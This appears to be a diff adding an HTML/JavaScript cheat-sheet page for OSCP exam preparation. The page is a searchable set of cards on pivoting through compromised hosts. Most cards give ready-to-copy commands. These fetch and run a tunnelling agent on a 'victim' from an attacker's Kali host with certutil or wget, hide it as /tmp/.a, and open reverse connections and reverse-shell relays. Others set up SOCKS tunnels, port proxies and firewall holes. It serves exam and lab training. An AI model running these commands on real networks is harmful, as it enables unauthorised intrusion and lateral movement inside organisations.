+      <a href="#card-ssh-l"><rect class="node-rect setup" x="579" y="195" width="222" height="44"/>
+        <text class="node-text" x="690" y="218">-L local forward</text>
+        <text class="node-sub" x="690" y="232">single port to inner host</text></a>
+      <path class="arrow" d="M 690 239 L 690 254"/>
+
+      <a href="#card-ssh-r"><rect class="node-rect setup" x="579" y="255" width="222" height="44"/>
+        <text class="node-text" x="690" y="278">-R reverse forward</text>
+        <text class="node-sub" x="690" y="292">victim → Kali (no inbound)</text></a>
+      <path class="arrow" d="M 690 299 L 690 314"/>
+
+      <a href="#card-proxychains"><rect class="node-rect enum" x="579" y="315" width="222" height="40"/>
+        <text class="node-text" x="690" y="337">+ proxychains for -D</text>
+        <text class="node-sub" x="690" y="349">socks5 127.0.0.1 &lt;port&gt;</text></a>
+
+      <!-- Column 4: native -->
+      <rect class="group-bg" x="836" y="100" width="244" height="320"/>
+      <text class="group-label" x="856" y="120">NATIVE / NO UPLOAD</text>
+
+      <a href="#card-netsh-portproxy"><rect class="node-rect setup" x="851" y="135" width="214" height="44"/>
+        <text class="node-text" x="958" y="158">netsh portproxy</text>
+        <text class="node-sub" x="958" y="172">Windows built-in NAT</text></a>
+      <path class="arrow" d="M 958 179 L 958 194"/>
+
+      <a href="#card-plink"><rect class="node-rect setup" x="851" y="195" width="214" height="44"/>
+        <text class="node-text" x="958" y="218">plink.exe (Win SSH)</text>
+        <text class="node-sub" x="958" y="232">pre-installed sometimes</text></a>
+      <path class="arrow" d="M 958 239 L 958 254"/>
+
+      <a href="#card-socat"><rect class="node-rect setup" x="851" y="255" width="214" height="44"/>
+        <text class="node-text" x="958" y="278">socat (Linux victim)</text>
+        <text class="node-sub" x="958" y="292">simple TCP relay</text></a>
+      <path class="arrow" d="M 958 299 L 958 314"/>
+
+      <a href="#card-msf-no-pivot"><rect class="node-rect warn" x="851" y="315" width="214" height="44"/>
+        <text class="node-text" x="958" y="338" style="fill:#ff6b6b">⚠ NO METASPLOIT</text>
+        <text class="node-sub" x="958" y="352">single-target rule</text></a>
+
+      <text class="label" x="550" y="570" style="font-size:10px; fill:#5fd49b">⚑ verify with TCP connect scan only — SYN scan won't pass tunnels</text>
+    </svg>
+  </div>
+</section>
+
+<!-- CARDS -->
+<section id="cards" class="cards-section">
+  <div class="flow-head" style="margin-bottom:0">
+    <div style="display:flex; gap:14px; align-items:baseline">
+      <span class="flow-num">[ ALL ]</span>
+      <span class="flow-title">TRIGGER CARDS · SEARCHABLE</span>
+    </div>
+    <div class="flow-trigger"><strong>⌘K</strong> to search · click diagram to jump</div>
+  </div>
+
+  <div class="filters">
+    <span class="filter-label">FILTER:</span>
+    <button class="pill active" data-filter="all">ALL <span class="pill-count" id="count-all">0</span></button>
+    <button class="pill" data-filter="setup">SETUP <span class="pill-count" id="count-setup">0</span></button>
+    <button class="pill" data-filter="enum">VERIFY <span class="pill-count" id="count-enum">0</span></button>
+    <button class="pill" data-filter="abuse">ADVANCED <span class="pill-count" id="count-abuse">0</span></button>
+    <button class="pill" data-filter="state-user">WINDOWS <span class="pill-count" id="count-state-user">0</span></button>
+    <button class="pill" data-filter="state-admin">LINUX <span class="pill-count" id="count-state-admin">0</span></button>
+  </div>
+  <div id="results"></div>
+</section>
+
+<!-- ANTI-PATTERNS -->
+<section id="anti" class="cards-section">
+  <div class="flow-head" style="margin-bottom:0">
+    <div style="display:flex; gap:14px; align-items:baseline">
+      <span class="flow-num">[ ⚠ ]</span>
+      <span class="flow-title" style="color:var(--warn)">ANTI-PATTERNS</span>
+    </div>
+  </div>
+  <div class="anti-list">
+    <div class="anti"><div class="anti-bad">Forget <code>ip route add</code> after <code>tunnel_start</code></div><div class="anti-fix">Tunnel is up, tools hang or hit Kali's default gateway. Always: tun → proxy → agent → start → <strong>route add</strong>. Forgetting this is the #1 ligolo failure.</div></div>
+    <div class="anti"><div class="anti-bad">Use <code>nmap -sS</code> (SYN scan) through any tunnel</div><div class="anti-fix">SYN scan needs raw sockets; user-mode tunnels can't pass them. Always <code>-sT</code> (TCP connect) through ligolo, chisel, proxychains. Add <code>-Pn</code> too — ping won't work either.</div></div>
+    <div class="anti"><div class="anti-bad">Use Metasploit to pivot on the AD set</div><div class="anti-fix">Exam rule: Metasploit on ONE target machine only. Pivoting = using on multiple = disqualifying. Use ligolo or SSH tunnels. Save MSF for a standalone.</div></div>
+    <div class="anti"><div class="anti-bad">Run ligolo agent without <code>-ignore-cert</code></div><div class="anti-fix">Self-signed cert from <code>proxy -selfcert</code> won't validate. Always: <code>agent.exe -connect &lt;KALI&gt;:11601 -ignore-cert</code> or it dies silently.</div></div>
+    <div class="anti"><div class="anti-bad">Try <code>xfreerdp /v:&lt;inner-IP&gt;</code> without route added</div><div class="anti-fix">Kali doesn't know how to reach inner subnet without route. RDP from member1 directly, or set up route + xfreerdp through tun.</div></div>
+    <div class="anti"><div class="anti-bad">Forget Kerberos clock skew when pivoting to DC</div><div class="anti-fix">Pivoting adds latency. If Kali clock drifts &gt;5min from DC: <code>KRB_AP_ERR_SKEW</code>. Always <code>sudo rdate -n &lt;DC&gt;</code> after tunnel is up.</div></div>
+    <div class="anti"><div class="anti-bad">Use one giant <code>-D</code> SSH tunnel + proxychains for everything</div><div class="anti-fix">proxychains is slow and unreliable for nmap/BloodHound. Ligolo TUN mode is 10x faster. If stuck with SSH, do per-port <code>-L</code> forwards for the specific service.</div></div>
+    <div class="anti"><div class="anti-bad">Leave the agent + listener running after exam</div><div class="anti-fix">Graders penalize lingering tunnels. Stop tunnel, delete agent binary, remove route. Document the cleanup steps in the report.</div></div>
+    <div class="anti"><div class="anti-bad">Run nmap full-port scan through proxychains</div><div class="anti-fix">It will literally take hours. Through pivot: targeted ports only (445, 5985, 88, 3389, 80, 443) with <code>-T4</code>. Full port scans on direct-reachable targets only.</div></div>
+    <div class="anti"><div class="anti-bad">Trust your route table without testing</div><div class="anti-fix"><code>ip route | grep ligolo</code> confirms route exists but not that traffic flows. Always verify with <code>nmap -sT -p 445 &lt;inner-IP&gt;</code> before assuming the tunnel works.</div></div>
+  </div>
+</section>
+
+<div class="foot-info">
+  <div>KEY → <code>⌘/Ctrl+K</code> search · <code>ESC</code> clear · hover commands to copy · click diagram nodes to jump</div>
+  <div style="margin-top:8px">phases: <span style="color:var(--setup)">SETUP</span> · <span style="color:var(--enum)">VERIFY</span> · <span style="color:var(--abuse)">ADVANCED</span> · <span style="color:var(--warn)">DON'T</span></div>
+  <div style="margin-top:8px; opacity:0.6">v1 · pivoting focus · companion to enum + privesc banks</div>
+</div>
+
+</main>
+
+<script>
+const patterns = [
+  // ===== PRE-PIVOT PREP =====
+  {
+    id: 'pivot-prep',
+    phase: 'setup', state: 'both', tags: [],
+    title: 'Pre-pivot check — am I on a dual-homed host?',
+    triggers: ['dual homed', 'pivot prep', 'two interfaces', 'inner subnet', 'find subnet', 'ipconfig'],
+    action: 'First action after foothold on a Windows/Linux host: check for second NIC. If there\'s an inner subnet, pivot is needed. Note the subnet — you\'ll need it for the route.',
+    cmd: `# Windows
+ipconfig /all
+route print
+arp -a
+
+# Linux
+ip a
+ip route
+arp -n
+
+# Look for two interfaces or a route to a non-Kali-reachable subnet.
+# Save the inner subnet — e.g. 10.10.10.0/24 — for ip route add later.`,
+    cleanup: '',
+    related: ['ligolo-tun', 'ssh-d']
+  },
+
+  // ===== LIGOLO =====
+  {
+    id: 'ligolo-tun',
+    phase: 'setup', state: 'both', tags: [],
+    title: 'Ligolo: create tun interface (Kali, one-time)',
+    triggers: ['ligolo', 'tun', 'tuntap', 'create interface', 'ip link'],
+    action: 'Once-per-machine setup. Creates the virtual interface ligolo-ng routes traffic through. Persists across reboots only if you save it — usually just re-run before each session.',
+    cmd: `# Create tun interface owned by your user
+sudo ip tuntap add user $USER mode tun ligolo
+
+# Bring it up
+sudo ip link set ligolo up
+
+# Verify
+ip a show ligolo
+# Should show: <POINTOPOINT,MULTICAST,NOARP> mtu 1500`,
+    cleanup: 'sudo ip link delete ligolo',
+    related: ['ligolo-proxy', 'ligolo-route']
+  },
+  {
+    id: 'ligolo-proxy',
+    phase: 'setup', state: 'both', tags: [],
+    title: 'Ligolo: start proxy on Kali',
+    triggers: ['ligolo proxy', 'selfcert', '11601', 'ligolo listen', 'proxy start'],
+    action: 'Runs in your tmux pane and listens on 11601 for incoming agent connections. The CLI prompt is where you control the session afterward.',
+    cmd: `# Download proxy + agent from
+# https://github.com/nicocha30/ligolo-ng/releases
+
+# Start proxy (Kali)
+./proxy -selfcert
+# Listens on 0.0.0.0:11601 with self-signed cert
+
+# If port 11601 is blocked, change it:
+./proxy -selfcert -laddr 0.0.0.0:443
+# (use a port the victim's outbound rules allow)`,
+    cleanup: 'Ctrl-C the proxy',
+    related: ['ligolo-agent', 'ligolo-tun']
+  },
+  {
+    id: 'ligolo-agent',
+    phase: 'setup', state: 'user', tags: [],
+    title: 'Ligolo: deploy + run agent (Windows)',
+    triggers: ['ligolo agent', 'agent.exe', 'ignore-cert', 'connect kali', 'deploy agent'],
+    action: 'Transfer agent.exe to victim, then connect back to Kali proxy. The -ignore-cert flag is required when using -selfcert on proxy side.',
+    cmd: `# 1. Transfer to victim (pick one)
+# From Kali — start http server
+python3 -m http.server 8080
+# On victim Windows shell
+certutil -urlcache -split -f http://<KALI>:8080/agent.exe C:\\Windows\\Temp\\a.exe
+# Or with evil-winrm:
+*Evil-WinRM* PS> upload /home/kali/agent.exe C:\\Windows\\Temp\\a.exe
+
+# 2. Run on victim
+C:\\Windows\\Temp\\a.exe -connect <KALI>:11601 -ignore-cert
+
+# Linux equivalent:
+wget http://<KALI>:8080/agent_linux -O /tmp/.a
+chmod +x /tmp/.a
+/tmp/.a -connect <KALI>:11601 -ignore-cert &`,
+    cleanup: 'taskkill /F /IM a.exe · del C:\\Windows\\Temp\\a.exe',
+    related: ['ligolo-tunnel', 'ligolo-proxy']
+  },
+  {
+    id: 'ligolo-tunnel',
+    phase: 'setup', state: 'both', tags: [],
+    title: 'Ligolo: select session + start tunnel',
+    triggers: ['ligolo session', 'tunnel_start', 'session select', '--tun ligolo'],
+    action: 'Inside the proxy CLI, the agent should appear once it connects. Select it, then start the tunnel pointed at your tun interface.',
+    cmd: `# In proxy CLI prompt:
+ligolo-ng » session
+# ? Specify a session : (pick agent number)
+
+[Agent : MEMBER1\\user@MEMBER1] » start --tun ligolo
+# (older versions: tunnel_start --tun ligolo)
+
+# Verify session is active:
+[Agent : MEMBER1\\user@MEMBER1] » ifconfig
+# shows victim's interfaces — inner subnet visible`,
+    cleanup: '[Agent] » stop · » session (then disconnect)',
+    related: ['ligolo-route', 'ligolo-agent']
+  },
+  {
+    id: 'ligolo-route',
+    phase: 'setup', state: 'both', tags: [],
+    title: 'Ligolo: add route for inner subnet (CRITICAL)',
+    triggers: ['ip route add', 'ligolo route', 'route inner', 'subnet route', 'add route'],
+    action: 'Without this, tools talk to Kali\'s default gateway, NOT the tunnel. Done in a different terminal from the proxy CLI.',
+    cmd: `# Different Kali terminal
+sudo ip route add 10.10.10.0/24 dev ligolo
+# (replace with actual inner subnet from pivot-prep card)
+
+# Verify
+ip route | grep ligolo
+# Should show: 10.10.10.0/24 dev ligolo scope link
+
+# Test
+ping -c 2 10.10.10.1
+# If reply comes back: tunnel works
+# If not: check tunnel_start ran, check agent still connected`,
+    cleanup: 'sudo ip route del 10.10.10.0/24',
+    related: ['ligolo-tunnel', 'verify-tcp']
+  },
+  {
+    id: 'ligolo-listener',
+    phase: 'setup', state: 'both', tags: [],
+    title: 'Ligolo: reverse listener (inner host → Kali)',
+    triggers: ['ligolo listener', 'listener_add', 'reverse shell pivot', 'inner reverse', 'callback'],
+    action: 'When you pop an inner host and want a reverse shell back to Kali, the shell can\'t directly reach you. Ligolo opens a port on the agent that forwards to Kali.',
+    cmd: `# In proxy CLI:
+[Agent] » listener_add --addr 0.0.0.0:4444 \\
+  --to 127.0.0.1:4444 --tcp
+
+# Now from inner host's POV, 4444 listens on member1's interface.
+# Set your reverse shell payload to connect to <MEMBER1-IP>:4444
+# Your nc -lvnp 4444 on Kali catches it.
+
+# List listeners
+[Agent] » listener_list
+
+# Remove
+[Agent] » listener_del --id <ID>`,
+    cleanup: '[Agent] » listener_del --id <ID>',
+    related: ['ligolo-tunnel', 'ligolo-route']
+  },
+
+  // ===== CHISEL =====
+  {
+    id: 'chisel-server',
+    phase: 'setup', state: 'both', tags: [],
+    title: 'Chisel: server on Kali (reverse mode)',
+    triggers: ['chisel', 'chisel server', 'reverse', '--reverse', 'socks fallback'],
+    action: 'Fallback when ligolo binary is flagged or you need SOCKS without TUN. --reverse allows client to specify forward direction.',
+    cmd: `# Download chisel from
+# https://github.com/jpillora/chisel/releases
+
+# Kali — server side, listen for clients
+./chisel server -p 8000 --reverse
+
+# Logs incoming connections.
+# After client connects with R:socks reverse:
+# SOCKS5 listens on 127.0.0.1:1080 on Kali side`,
+    cleanup: 'Ctrl-C the chisel server',
+    related: ['chisel-client', 'proxychains']
+  },
+  {
+    id: 'chisel-client',
+    phase: 'setup', state: 'both', tags: [],
+    title: 'Chisel: client on victim (reverse SOCKS)',
+    triggers: ['chisel client', 'chisel reverse', 'R:socks', 'victim chisel'],
+    action: 'Victim connects out to Kali, opens SOCKS5 listener back on Kali side. Forces all-outbound (works behind NAT/firewall).',
+    cmd: `# Transfer chisel to victim (same as ligolo agent transfer)
+
+# Windows victim
+chisel.exe client <KALI>:8000 R:socks
+
+# Linux victim
+./chisel client <KALI>:8000 R:socks &
+
+# This opens SOCKS5 on Kali side at 127.0.0.1:1080
+# (server in --reverse mode required for R:)`,
+    cleanup: 'kill the chisel client process · del chisel binary',
+    related: ['chisel-server', 'proxychains']
+  },
+  {
+    id: 'proxychains',
+    phase: 'setup', state: 'both', tags: [],
+    title: 'proxychains.conf for SOCKS tunneling',
+    triggers: ['proxychains', 'proxychains.conf', 'socks5', '127.0.0.1 1080', 'proxychains-ng'],
+    action: 'Wraps any tool to route through a SOCKS proxy. Required for chisel + SSH -D. NOT needed for ligolo TUN. Slow but universal.',
+    cmd: `# /etc/proxychains.conf — minimal config
+sudo tee -a /etc/proxychains.conf <<EOF
+[ProxyList]
+socks5 127.0.0.1 1080
+EOF
+
+# Make sure strict_chain is set (default)
+# proxy_dns enables DNS through SOCKS
+
+# Usage
+proxychains -q nmap -sT -Pn -p 445,5985 <inner-IP>
+proxychains -q smbclient -L //<inner-IP> -N
+proxychains -q evil-winrm -i <inner-IP> -u <u> -p <p>
+proxychains -q crackmapexec smb <subnet>/24 -u <u> -p <p>
+
+# -q = quiet (suppress proxychains banners)`,
+    cleanup: '# revert /etc/proxychains.conf if you added rules',
+    related: ['chisel-client', 'ssh-d']
+  },
+
+  // ===== SSH =====
+  {
+    id: 'ssh-d',
+    phase: 'setup', state: 'admin', tags: [],
+    title: 'SSH dynamic forward (-D) — SOCKS via SSH',
+    triggers: ['ssh -D', 'ssh dynamic', 'dynamic forward', 'ssh socks', 'ssh tunnel socks'],
+    action: 'When you\'ve compromised a Linux box with SSH access (or sshd is up), -D opens a local SOCKS5 proxy that routes through the SSH session. Cleanest pivot for Linux foothold.',
+    cmd: `# From Kali — connect to compromised Linux host
+ssh -D 1080 -N -f <user>@<linux-victim>
+# -D 1080 — local SOCKS5 port
+# -N      — no shell, just tunnel
+# -f      — fork to background
+
+# Now use proxychains (set socks5 127.0.0.1 1080)
+proxychains -q nmap -sT -Pn -p 445 <inner-IP>
+
+# With key
+ssh -i id_rsa -D 1080 -N -f <user>@<victim>
+
+# Multiple hops
+ssh -D 1080 -J jump1@host1 -N -f user@host2`,
+    cleanup: 'pkill -f "ssh -D 1080"',
+    related: ['ssh-l', 'proxychains']
+  },
+  {
+    id: 'ssh-l',
+    phase: 'setup', state: 'admin', tags: [],
+    title: 'SSH local forward (-L) — single port',
+    triggers: ['ssh -L', 'ssh local forward', 'port forward', 'single port', 'specific service'],
+    action: 'Forward one specific port on Kali to one port on an inner host. Use when you only need to hit ONE service through the pivot (e.g. RDP, a web server).',
+    cmd: `# Kali → SSH to pivot → forwards Kali:3389 to inner:3389
+ssh -L 3389:<inner-IP>:3389 -N -f <user>@<linux-victim>
+
+# Connect locally:
+xfreerdp /v:127.0.0.1 /u:Administrator
+
+# Multiple ports — repeat -L flag
+ssh -L 445:<inner-IP>:445 \\
+    -L 5985:<inner-IP>:5985 \\
+    -N -f <user>@<victim>
+
+# Then:
+smbclient -L //127.0.0.1 -U <u>%<p>
+evil-winrm -i 127.0.0.1 -u <u> -p <p>`,
+    cleanup: 'pkill -f "ssh -L 3389"',
+    related: ['ssh-d', 'ssh-r']
+  },
+  {
+    id: 'ssh-r',
+    phase: 'setup', state: 'admin', tags: [],
+    title: 'SSH remote forward (-R) — victim opens listener',
+    triggers: ['ssh -R', 'ssh reverse', 'remote forward', 'victim to kali', 'no inbound'],
+    action: 'Compromised Linux host has no inbound but can dial out to Kali. From the victim, -R opens a listener on Kali that forwards back into the victim\'s network.',
+    cmd: `# Pre-req: SSH server running on Kali
+sudo systemctl start ssh
+
+# From the Linux victim (with outbound to Kali)
+ssh -R 8888:<inner-IP>:445 -N -f kali@<KALI>
+
+# Now on Kali, port 8888 = inner-IP:445
+smbclient -L //127.0.0.1 -p 8888 -U <u>%<p>
+
+# Reverse SOCKS variant (less common)
+# Victim opens SOCKS5 listener on Kali:
+ssh -R 1080 -N -f kali@<KALI>
+# (requires GatewayPorts=yes in Kali's sshd_config)`,
+    cleanup: 'kill the ssh process on victim',
+    related: ['ssh-l', 'ssh-d']
+  },
+
+  // ===== WINDOWS NATIVE =====
+  {
+    id: 'netsh-portproxy',
+    phase: 'setup', state: 'user', tags: [],
+    title: 'netsh portproxy — Windows native, no upload',
+    triggers: ['netsh', 'portproxy', 'windows native', 'no upload', 'av flagged'],
+    action: 'Built-in Windows command. Forwards one port to another host:port. Needs admin (NT AUTHORITY\\SYSTEM works). Use when you can\'t upload binaries or AV nukes everything.',
+    cmd: `# On victim (Windows, as admin)
+# Forward victim:8445 → inner-IP:445
+netsh interface portproxy add v4tov4 \\
+  listenaddress=0.0.0.0 listenport=8445 \\
+  connectaddress=<inner-IP> connectport=445
+
+# Open firewall for that port
+netsh advfirewall firewall add rule \\
+  name="pivot8445" dir=in action=allow \\
+  protocol=tcp localport=8445
+
+# Now from Kali (no extra tunneling needed if victim is reachable)
+smbclient -L //<victim>:8445 -U <u>%<p>
+
+# List rules
+netsh interface portproxy show all`,
+    cleanup: `netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=8445 · netsh advfirewall firewall delete rule name="pivot8445"`,
+    related: ['plink', 'socat']
+  },
+  {
+    id: 'plink',
+    phase: 'setup', state: 'user', tags: [],
+    title: 'plink.exe — Windows SSH tunneling',
+    triggers: ['plink', 'plink.exe', 'putty', 'windows ssh client', 'plink tunnel'],
+    action: 'PuTTY\'s CLI binary. Sometimes pre-installed. Use to create -R or -D tunnels from Windows victim back to Kali SSH server.',
+    cmd: `# Upload plink.exe if not present
+# Then on Windows victim:
+plink.exe -ssh kali@<KALI> -R 8080:<inner-IP>:80 -N -P 22
+
+# Accept host key first time (-batch suppresses prompt):
+plink.exe -ssh -batch kali@<KALI> ...
+
+# With password
+plink.exe -ssh -pw <pwd> -R 8080:<inner-IP>:80 -N kali@<KALI>
+
+# Background: use start /B or Win+R cmd /c`,
+    cleanup: 'taskkill /F /IM plink.exe',
+    related: ['ssh-r', 'netsh-portproxy']
+  },
+  {
+    id: 'socat',
+    phase: 'setup', state: 'admin', tags: [],
+    title: 'socat — Linux port relay',
+    triggers: ['socat', 'tcp relay', 'tcp forward', 'simple pivot', 'port relay'],
+    action: 'On Linux pivot host with socat installed. Simple TCP-to-TCP forward. Limited (one port, no SOCKS) but works in pinch when you don\'t want to upload anything heavier.',
+    cmd: `# On pivot Linux host (sometimes pre-installed)
+socat TCP-LISTEN:8445,fork TCP:<inner-IP>:445 &
+
+# From Kali, hit the pivot host's 8445 → reaches inner-IP:445
+smbclient -L //<pivot-IP>:8445 -U <u>%<p>
+
+# Reverse style (pivot connects out to Kali)
+# Kali side:
+socat TCP-LISTEN:9000,fork TCP:<final-target>:80
+# Pivot side connects out and relays
+
+# Variation: SSL-wrap
+socat TCP-LISTEN:8443,fork OPENSSL:<target>:443`,
+    cleanup: 'kill the socat process',
+    related: ['netsh-portproxy', 'ssh-l']
+  },
+
+  // ===== VERIFY =====
+  {
+    id: 'verify-tcp',
+    phase: 'enum', state: 'both', tags: [],
+    title: 'Verify tunnel — TCP connect scan only',
+    triggers: ['verify tunnel', 'test pivot', 'nmap pivot', '-sT', 'tcp connect', 'tunnel test'],
+    action: 'Tunnels can\'t pass SYN scans (raw sockets). Always use -sT for connect scan + -Pn (no host discovery). Test against a port you KNOW is open.',
+    cmd: `# Ligolo / native pivots (route added)
+sudo nmap -Pn -sT -p 445,5985,88,3389 <inner-IP>
+
+# Through proxychains (chisel / SSH -D)
+proxychains -q nmap -Pn -sT -p 445,5985 <inner-IP>
+
+# Quick "is the tunnel up?" one-liner
+nc -nvz <inner-IP> 445
+
+# If nothing works:
+# 1. Check route — ip route | grep ligolo
+# 2. Check agent — still connected in proxy CLI?
+# 3. Check inner host actually has that port open (via member1 shell)`,
+    cleanup: '',
+    related: ['ligolo-route', 'troubleshoot']
+  },
+  {
+    id: 'troubleshoot',
+    phase: 'enum', state: 'both', tags: [],
+    title: '"Tunnel up but tools fail" — debug checklist',
+    triggers: ['troubleshoot', 'not working', 'tunnel broken', 'tools fail', 'connection refused', 'no route'],
+    action: 'The five things to check in order when tunnel "should work" but doesn\'t. 95% of failures are one of these.',
+    cmd: `# 1. Route exists?
+ip route | grep ligolo
+# If missing: sudo ip route add <subnet> dev ligolo
+
+# 2. Agent still connected?
+# Look at proxy CLI — session should show online
+
+# 3. Using SYN scan accidentally?
+# nmap MUST be -sT through any tunnel
+
+# 4. DNS not resolving for FQDN target?
+echo "<inner-IP>  target.corp.local target" | sudo tee -a /etc/hosts
+
+# 5. Kerberos clock skew?
+sudo rdate -n <DC-IP>
+# Or: sudo ntpdate <DC-IP>
+
+# 6. Firewall on inner host?
+# Test 445 vs 5985 vs 3389 — different blocks possible`,
+    cleanup: '',
+    related: ['verify-tcp', 'ligolo-route']
+  },
+
+  // ===== ADVANCED =====
+  {
+    id: 'double',
+    phase: 'abuse', state: 'both', tags: [],
+    title: 'Double pivot — chained ligolo (3 networks deep)',
+    triggers: ['double pivot', 'chained tunnel', 'three hops', 'inner inner', 'nested pivot'],
+    action: 'You pop member1, pivot to member2, find member2 has a third subnet. Run ligolo agent on Kali listening for member2 → proxy on member2 → agent on member3.',
+    cmd: `# Conceptually:
+# Kali --[ligolo1]-- member1 --[ligolo2]-- member2 --[?]-- member3
+
+# Step 1: standard ligolo tunnel to member1 (covered in earlier cards)
+
+# Step 2: From Kali, start SECOND proxy on different port
+./proxy -selfcert -laddr 0.0.0.0:11602
+
+# Step 3: Upload agent to member2 (use member1 as relay or direct via route)
+# Member2 connects to <KALI>:11602
+agent.exe -connect <KALI>:11602 -ignore-cert
+
+# Step 4: On Kali, create second tun interface
+sudo ip tuntap add user $USER mode tun ligolo2
+sudo ip link set ligolo2 up
+
+# In SECOND proxy CLI:
+ligolo-ng » session
+[Agent : member2] » start --tun ligolo2
+
+# Add route for inner-inner subnet
+sudo ip route add <inner-inner-subnet>/24 dev ligolo2`,
+    cleanup: 'Reverse order: stop ligolo2 → del route → stop ligolo1 → del route',
+    related: ['ligolo-tunnel', 'ligolo-route']
+  },
+  {
+    id: 'msf-no-pivot',
+    phase: 'abuse', state: 'both', tags: [],
+    title: '⚠ NO Metasploit for pivoting on OSCP exam',
+    triggers: ['metasploit pivot', 'msf pivot', 'route add msf', 'meterpreter', 'exam rule', 'no msf'],
+    action: 'OSCP exam rule: Metasploit allowed on ONE target machine total. Pivoting = using on >1 machine = disqualifying. Use ligolo, chisel, or SSH instead. Save MSF for a standalone.',
+    cmd: `# ✗ DO NOT DO THIS ON THE OSCP EXAM:
+# meterpreter > run autoroute -s 10.10.10.0/24
+# meterpreter > portfwd add ...
+# use auxiliary/server/socks_proxy
+
+# ✓ DO THIS INSTEAD:
+# Ligolo-ng (preferred):
+./proxy -selfcert
+agent.exe -connect <KALI>:11601 -ignore-cert
+# session → start --tun ligolo
+sudo ip route add <inner-subnet> dev ligolo
+
+# ✓ Or SSH tunnels if Linux pivot:
+ssh -D 1080 -N -f <user>@<linux-pivot>
+# + proxychains
+
+# Reminder: PG Practice + HTB don't have this rule.
+# This restriction is ONLY for the actual OSCP exam.`,
+    cleanup: '',
+    related: ['ligolo-tunnel', 'ssh-d']
+  },
+];
+
+const phaseOrder = ['setup', 'access', 'enum', 'abuse', 'win'];
+const phaseLabels = { setup: 'SETUP', access: 'ACCESS', enum: 'VERIFY', abuse: 'ADVANCED', win: 'WIN' };
+
+const $ = (sel) => document.querySelector(sel);
+const searchEl = $('#search'); const resultsEl = $('#results');
+const filterBtns = document.querySelectorAll('.pill');
+let activeFilter = 'all'; let query = '';
+
+function escapeHtml(s) { return String(s).replace(/[&<>"']/g, c => ({ '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;' }[c])); }
+function highlight(text, q) {
+  if (!q) return escapeHtml(text);
+  const escaped = escapeHtml(text);
+  const terms = q.split(/\s+/).filter(t => t.length > 0).map(t => t.replace(/[.*+?^${}()|[\]\\]/g, '\\$&'));
+  if (!terms.length) return escaped;
+  const re = new RegExp(`(${terms.join('|')})`, 'gi');
+  return escaped.replace(re, '<mark>$1</mark>');
+}
+function matchesQuery(p, q) {
+  if (!q) return true;
+  const hay = [p.title, p.action, p.cmd, p.triggers.join(' '), (p.tags||[]).join(' '), p.id].join(' ').toLowerCase();
+  const terms = q.toLowerCase().split(/\s+/).filter(t => t.length > 0);
+  return terms.every(t => hay.includes(t));
+}
+function matchesFilter(p, f) {
+  if (f === 'all') return true;
+  if (f === 'state-user') return p.state === 'user' || p.state === 'both';
+  if (f === 'state-admin') return p.state === 'admin' || p.state === 'both';
+  return p.phase === f;
+}
+function renderCard(p, q) {
+  const tH = p.triggers.map(t => {
+    const m = q && q.toLowerCase().split(/\s+/).some(qt => qt.length > 0 && t.toLowerCase().includes(qt));
+    return `<span class="trigger ${m ? 'match' : ''}">${escapeHtml(t)}</span>`;
+  }).join('');
+  const cH = p.cmd ? `<div class="cmd-wrap"><pre class="cmd">${highlight(p.cmd, q)}</pre><button class="cmd-copy" data-cmd="${encodeURIComponent(p.cmd)}">COPY</button></div>` : '';
+  const clH = p.cleanup ? `<div class="cleanup"><span class="cleanup-label">CLEANUP</span>${escapeHtml(p.cleanup)}</div>` : '';
+  const sL = { user: '<span class="state-tag user">WINDOWS</span>', admin: '<span class="state-tag admin">LINUX</span>', both: '<span class="state-tag both">EITHER</span>' }[p.state] || '';
+  return `<article class="card" data-phase="${p.phase}" data-state="${p.state}" id="card-${p.id}">
+    <div class="card-head"><div class="card-title">${highlight(p.title, q)}</div><span class="card-cat">${phaseLabels[p.phase]}</span></div>
+    <div class="triggers">${tH}</div>
+    <div class="arrow-line"><span class="arrow">→</span><span class="action">${highlight(p.action, q)}</span></div>
+    ${cH}${clH}<div class="card-foot">${sL}</div></article>`;
+}
+function render() {
+  const f = patterns.filter(p => matchesFilter(p, activeFilter) && matchesQuery(p, query));
+  $('#resultCount').textContent = f.length;
+  if (f.length === 0) { resultsEl.innerHTML = `<div class="empty"><div class="empty-icon">⌬</div><div class="empty-title">no patterns match</div><div class="empty-hint">try: 'ligolo', 'chisel', 'ssh', 'proxychains', 'route'</div></div>`; return; }
+  let html = '';
+  if (activeFilter === 'all' && !query) {
+    phaseOrder.forEach(ph => {
+      const inPh = f.filter(p => p.phase === ph);
+      if (!inPh.length) return;
+      html += `<div style="margin: 18px 0 10px; font-family: 'JetBrains Mono', monospace; font-size: 11px; color: var(--text-faint); text-transform: uppercase; letter-spacing: 0.2em;">▸ ${phaseLabels[ph]} <span style="opacity:0.5">[${inPh.length}]</span></div>`;
+      html += `<div class="grid">${inPh.map(p => renderCard(p, query)).join('')}</div>`;
+    });
+  } else { html = `<div class="grid">${f.map(p => renderCard(p, query)).join('')}</div>`; }
+  resultsEl.innerHTML = html;
+  resultsEl.querySelectorAll('.cmd-copy').forEach(btn => {
+    btn.addEventListener('click', async (e) => {
+      e.stopPropagation();
+      try { await navigator.clipboard.writeText(decodeURIComponent(btn.dataset.cmd)); btn.textContent = 'COPIED'; btn.classList.add('copied'); setTimeout(() => { btn.textContent = 'COPY'; btn.classList.remove('copied'); }, 1500); } catch (err) { btn.textContent = 'ERR'; }
+    });
+  });
+}
+function updateCounts() {
+  $('#totalCount').textContent = patterns.length;
+  $('#count-all').textContent = patterns.length;
+  phaseOrder.forEach(ph => { const c = patterns.filter(p => p.phase === ph).length; const el = document.getElementById(`count-${ph}`); if (el) el.textContent = c; });
+  const uE = document.getElementById('count-state-user'); const aE = document.getElementById('count-state-admin');
+  if (uE) uE.textContent = patterns.filter(p => p.state === 'user' || p.state === 'both').length;
+  if (aE) aE.textContent = patterns.filter(p => p.state === 'admin' || p.state === 'both').length;
+}
+searchEl.addEventListener('input', (e) => { query = e.target.value.trim(); render(); });
+filterBtns.forEach(btn => { btn.addEventListener('click', () => { activeFilter = btn.dataset.filter; filterBtns.forEach(b => b.classList.toggle('active', b === btn)); render(); document.getElementById('cards').scrollIntoView({behavior: 'smooth', block: 'start'}); }); });
+document.addEventListener('keydown', (e) => {
+  if ((e.metaKey || e.ctrlKey) && e.key === 'k') { e.preventDefault(); searchEl.focus(); searchEl.select(); }
+  if (e.key === 'Escape' && document.activeElement === searchEl) { searchEl.value = ''; query = ''; render(); searchEl.blur(); }
+});
